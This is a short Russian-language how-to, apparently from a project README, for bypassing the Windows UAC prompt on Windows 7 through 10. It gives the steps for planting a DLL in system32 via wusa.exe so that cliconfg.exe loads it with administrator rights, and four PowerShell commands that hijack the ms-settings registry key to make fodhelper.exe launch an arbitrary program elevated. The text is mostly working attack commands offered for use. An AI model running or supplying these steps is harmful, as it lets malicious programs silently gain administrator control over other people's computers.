Обход окна UAC Windows 7 - Windows 10 (RAD Studio XE7)

Windows 7
Обе Dll (под  64 бит и 32 бит) упакуем в .cab архив командой из cmd с правами администратора  
(Пример: makecab "C:\dll\Win64\ntwdblib.dll" "C:\ntwdblib64.cab")
ntwdblib32.cab и ntwdblib64.cab уже прописанны в коде массивом строк, в проекте execonsole.
Используем уязвимость процесса из белого списка "%systemroot%\system32\cliconfg.exe"
Программно, с промощью установщика обновлений "%systemroot%\system32\wusa.exe" (он тоже в белом списке windows) 
(Пример: wusa "%temp%\ntwdblib.cab" /quiet /extract:%systemroot%\system32\)
делаем распаковку ntwdblib64.cab или ntwdblib32.cab в зависимости от разрядности 
в директорию "%systemroot%\system32\ntwdblib.dll"
Запускаем процесс "%systemroot%\system32\cliconfg.exe" с правами пользователя, но учитывая что он находится в белом списке windows
он исполняет себя с привилегиями администратора и подгружает нашу dll библиотеку "%systemroot%\system32\ntwdblib.dll"
в связи с чем она наследует права администратора и способна исполнить любой PE файл в обход окна UAC. 

Windows 10
Используем уязвимость процесса из белого списка "fodhelper.exe" 
powershell New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "путь до нашего файла" -Force
powershell New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
powershell Start-Process "fodhelper.exe"
powershell Remove-Item "HKCU:\Software\Classes\ms-settings\shell\open\command" -Recurse -Force



